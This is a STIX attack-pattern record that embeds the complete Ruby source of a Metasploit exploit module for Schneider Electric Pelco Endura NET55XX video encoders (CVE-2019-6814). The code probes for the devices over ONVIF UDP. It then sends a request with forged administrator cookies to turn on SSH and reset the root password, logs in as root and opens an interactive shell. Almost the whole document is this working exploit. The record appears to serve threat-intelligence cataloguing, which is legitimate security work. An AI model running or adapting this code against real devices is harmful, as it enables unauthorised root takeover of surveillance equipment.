{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d1e52b76-d6d3-43fd-83df-3a9cc8868861",
    "created": "2024-08-14T17:14:37.597027Z",
    "modified": "2024-08-14T17:14:37.597031Z",
    "name": "Schneider Electric Pelco Endura NET55XX Encoder",
    "description": " This module exploits inadequate access controls within the webUI to enable the SSH service and change the root password. This module has been tested successfully on: NET5501, NET5501-I, NET5501-XT, NET5504, NET5500, NET5516, NET550 versions.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/http/schneider_electric_net55xx_encoder.rb",
            "external_id": "schneider_electric_net55xx_encoder.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-6814"
        },
        {
            "source_name": "reference",
            "url": "https://www.schneider-electric.com/en/download/document/SEVD-2019-134-01/"
        }
    ],
    "x_code_snippet": "\ufeff##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Udp\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::SSH\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Schneider Electric Pelco Endura NET55XX Encoder',\n        'Description' => %q{\n          This module exploits inadequate access controls within the webUI to enable\n          the SSH service and change the root password. This module has been tested successfully\n          on: NET5501, NET5501-I, NET5501-XT, NET5504, NET5500, NET5516, NET550 versions.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Lucas Dinucci <idntk.lucdin@gmail.com>',\n          'Vitor Esperan\u00e7a <vitor@machiaveliclabs.com>'\n        ],\n        'References' => [\n          ['CVE', '2019-6814'],\n          ['URL', 'https://www.schneider-electric.com/en/download/document/SEVD-2019-134-01/']\n        ],\n        'Payload' => {\n          'Compat' => {\n            'PayloadType' => 'cmd_interact',\n            'ConnectionType' => 'find'\n          }\n        },\n        'Platform' => 'unix',\n        'Arch' => ARCH_CMD,\n        'Targets' => [ [ 'Universal', {} ] ],\n        'Privileged' => true,\n        'DisclosureDate' => '2019-01-25',\n        'DefaultTarget' => 0\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('NEW_PASSWORD', [ true, 'New password to be set for the root account', Rex::Text.rand_text_alphanumeric(16)]),\n        OptInt.new('TIMEOUT', [ true, 'Timeout for the requests', 10])\n      ]\n    )\n\n    register_advanced_options(\n      [\n        OptInt.new('UDP_PORT', [ true, 'UDP port for the ONVIF service', 3702]),\n        OptBool.new('SSH_DEBUG', [ false, 'Enable SSH debugging output (Extreme verbosity!)', false]),\n        OptInt.new('SSH_TIMEOUT', [ false, 'Specify the maximum time to negotiate a SSH session', 30])\n      ]\n    )\n  end\n\n  def new_password\n    datastore['NEW_PASSWORD']\n  end\n\n  def check\n    xmlPayload = '<?xml version=\"1.0\" encoding=\"UTF-8\"?>'\\\n                 '<Envelope xmlns=\"http://www.w3.org/2003/05/soap-envelope\">'\\\n                 '<Header xmlns:a=\"http://schemas.xmlsoap.org/ws/2004/08/addressing\">'\\\n                 '<a:Action mustUnderstand=\"1\">http://schemas.xmlsoap.org/ws/2005/04/discovery/Probe</a:Action>'\\\n                 '<a:MessageID>uuid:f3d577a3-431f-4450-ab45-b480042b9c74</a:MessageID>'\\\n                 '<a:ReplyTo>'\\\n                 '<a:Address>http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>'\\\n                 '</a:ReplyTo>'\\\n                 '<a:To mustUnderstand=\"1\">urn:schemas-xmlsoap-org:ws:2005:04:discovery</a:To>'\\\n                 '</Header>'\\\n                 '<Body>'\\\n                 '<Probe xmlns=\"http://schemas.xmlsoap.org/ws/2005/04/discovery\">'\\\n                 '<Types xmlns:dp0=\"http://www.onvif.org/ver10/network/wsdl\">dp0:NetworkVideoTransmitter</Types>'\\\n                 '</Probe>'\\\n                 '</Body>'\\\n                 '</Envelope><?xml version=\"1.0\" encoding=\"UTF-8\"?>'\n\n    connect_udp(true, { 'RPORT' => datastore['UDP_PORT'] })\n    udp_sock.put(xmlPayload)\n    resp = []\n    resp << udp_sock.get(datastore['TIMEOUT'])\n    xmlResponse = resp.join(',')\n    disconnect_udp\n    if xmlResponse.include?('NET5501') || xmlResponse.include?('NET5501-I') || xmlResponse.include?('NET5501-XT') || xmlResponse.include?('NET5504') || xmlResponse.include?('NET5500') || xmlResponse.include?('NET5516') || xmlResponse.include?('NET5508')\n      return Exploit::CheckCode::Appears\n    end\n\n    CheckCode::Safe\n  end\n\n  def change_password\n    print_status(\"#{peer} - Attempt to change the root password...\")\n    post = { enable: true, passwd: new_password, userid: 'root' }.to_json\n\n    login = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/cgi-bin/webra.fcgi?network/ssh'),\n      'data' => post,\n      'headers' =>\n      {\n        'Cookie' => 'live_onoff=0; userid=admin; grpid=ADMIN; permission=2147483647',\n        'Content-Type' => 'application/json;charset=utf-8'\n      }\n    }, timeout = datastore['TIMEOUT'])\n\n    fail_with(Failure::UnexpectedReply, 'Failed to change root password') unless login && login.code == 200\n    print_good(\"#{rhost}:80 - Successfully changed the root password...\")\n    print_good(\"#{rhost}:80 - New credentials: User: root / Password: #{new_password}\")\n  end\n\n  def do_login\n    change_password\n    print_status(\"#{rhost}:22 - Attempt to start a SSH connection...\")\n    opts = ssh_client_defaults.merge({\n      auth_methods: ['password', 'keyboard-interactive'],\n      port: 22,\n      password: new_password\n    })\n    opts.merge!(verbose: :debug) if datastore['SSH_DEBUG']\n    begin\n      ssh = nil\n      ::Timeout.timeout(datastore['SSH_TIMEOUT']) do\n        ssh = Net::SSH.start(datastore['RHOST'], 'root', opts)\n      end\n    rescue Rex::ConnectionError\n    rescue Net::SSH::Disconnect, ::EOFError\n      print_error \"#{rhost}:22 SSH - Disconnected during negotiation\"\n    rescue ::Timeout::Error\n      print_error \"#{rhost}:22 SSH - Timed out during negotiation\"\n    rescue Net::SSH::AuthenticationFailed\n      print_error \"#{rhost}:22 SSH - Failed authentication\"\n    rescue Net::SSH::Exception => e\n      print_error \"#{rhost}:22 SSH Error: #{e.class} : #{e.message}\"\n    end\n    if ssh\n      conn = Net::SSH::CommandStream.new(ssh)\n      return conn\n    end\n  end\n\n  def exploit\n    conn = do_login\n    if conn\n      print_good(\"#{rhost}:22 - Session established \")\n      handler(conn.lsock)\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-01-25",
    "x_mitre_platforms": [
        "unix'"
    ]
}